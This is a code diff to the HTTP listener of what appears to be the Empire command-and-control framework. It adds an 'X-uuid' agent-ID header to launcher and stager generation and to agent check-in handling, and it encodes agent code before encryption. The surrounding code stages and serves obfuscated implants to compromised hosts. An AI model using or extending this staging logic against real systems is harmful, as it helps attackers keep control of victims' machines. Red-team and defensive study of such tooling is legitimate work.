@@ -176,7 +176,7 @@ class Listener:
         return True
 
 
-    def generate_launcher(self, encode=True, obfuscate=False, obfuscationCommand="", userAgent='default', proxy='default', proxyCreds='default', stagerRetries='0', language=None, safeChecks='', listenerName=None):
+    def generate_launcher(self, encode=True, obfuscate=False, obfuscationCommand="", userAgent='default', proxy='default', proxyCreds='default', stagerRetries='0', language=None, safeChecks='', listenerName=None, agent_id=None):
         """
         Generate a basic launcher for the specified listener.
         """
@@ -192,6 +192,8 @@ class Listener:
             launcher = listenerOptions['Launcher']['Value']
             stagingKey = listenerOptions['StagingKey']['Value']
             profile = listenerOptions['DefaultProfile']['Value']
+            if agent_id:
+                profile += "|X-uuid:" + agent_id
             uris = [a for a in profile.split('|')[0].split(',')]
             stage0 = random.choice(uris)
             customHeaders = profile.split('|')[2:]
@@ -428,7 +430,7 @@ class Listener:
             print helpers.color("[!] listeners/http generate_launcher(): invalid listener name specification!")
 
 
-    def generate_stager(self, listenerOptions, encode=False, encrypt=True, obfuscate=False, obfuscationCommand="", language=None):
+    def generate_stager(self, listenerOptions, encode=False, encrypt=True, obfuscate=False, obfuscationCommand="", language=None, agent_id=None):
         """
         Generate the stager code needed for communications with this listener.
         """
@@ -439,6 +441,8 @@ class Listener:
 
 
         profile = listenerOptions['DefaultProfile']['Value']
+        if agent_id:
+            profile += "|X-uuid:" + agent_id
         uris = [a.strip('/') for a in profile.split('|')[0].split(',')]
         launcher = listenerOptions['Launcher']['Value']
         stagingKey = listenerOptions['StagingKey']['Value']
@@ -847,6 +851,7 @@ def send_message(packets=None):
             dispatcher.send("[*] GET request for %s/%s from %s" % (request.host, request_uri, clientIP), sender='listeners/http')
             routingPacket = None
             cookie = request.headers.get('Cookie')
+            agent_id = request.headers.get('X-uuid')
             if cookie and cookie != '':
                 try:
                     # see if we can extract the 'routing packet' from the specified cookie location
@@ -865,7 +870,7 @@ def send_message(packets=None):
 
             if routingPacket:
                 # parse the routing packet and process the results
-                dataResults = self.mainMenu.agents.handle_agent_data(stagingKey, routingPacket, listenerOptions, clientIP)
+                dataResults = self.mainMenu.agents.handle_agent_data(stagingKey, routingPacket, listenerOptions, clientIP, agent_id=agent_id)
                 if dataResults and len(dataResults) > 0:
                     for (language, results) in dataResults:
                         if results:
@@ -874,7 +879,7 @@ def send_message(packets=None):
 
                                 # step 2 of negotiation -> return stager.ps1 (stage 1)
                                 dispatcher.send("[*] Sending %s stager (stage 1) to %s" % (language, clientIP), sender='listeners/http')
-                                stage = self.generate_stager(language=language, listenerOptions=listenerOptions, obfuscate=self.mainMenu.obfuscate, obfuscationCommand=self.mainMenu.obfuscateCommand)
+                                stage = self.generate_stager(language=language, listenerOptions=listenerOptions, obfuscate=self.mainMenu.obfuscate, obfuscationCommand=self.mainMenu.obfuscateCommand, agent_id=agent_id)
                                 return make_response(stage, 200)
 
                             elif results.startswith('ERROR:'):
@@ -914,9 +919,10 @@ def send_message(packets=None):
             requestData = request.get_data()
             dispatcher.send("[*] POST request data length from %s : %s" % (clientIP, len(requestData)), sender='listeners/http')
 
+            agent_id = request.headers.get('X-uuid')
             # the routing packet should be at the front of the binary request.data
             #   NOTE: this can also go into a cookie/etc.
-            dataResults = self.mainMenu.agents.handle_agent_data(stagingKey, requestData, listenerOptions, clientIP)
+            dataResults = self.mainMenu.agents.handle_agent_data(stagingKey, requestData, listenerOptions, clientIP, agent_id=agent_id)
             if dataResults and len(dataResults) > 0:
                 for (language, results) in dataResults:
                     if results:
@@ -938,7 +944,7 @@ def send_message(packets=None):
 
                             # step 6 of negotiation -> server sends patched agent.ps1/agent.py
                             agentCode = self.generate_agent(language=language, listenerOptions=tempListenerOptions, obfuscate=self.mainMenu.obfuscate, obfuscationCommand=self.mainMenu.obfuscateCommand)
-                            encryptedAgent = encryption.aes_encrypt_then_hmac(sessionKey, agentCode)
+                            encryptedAgent = encryption.aes_encrypt_then_hmac(sessionKey, agentCode.encode('utf-8'))
                             # TODO: wrap ^ in a routing packet?
 
                             return make_response(encryptedAgent, 200)
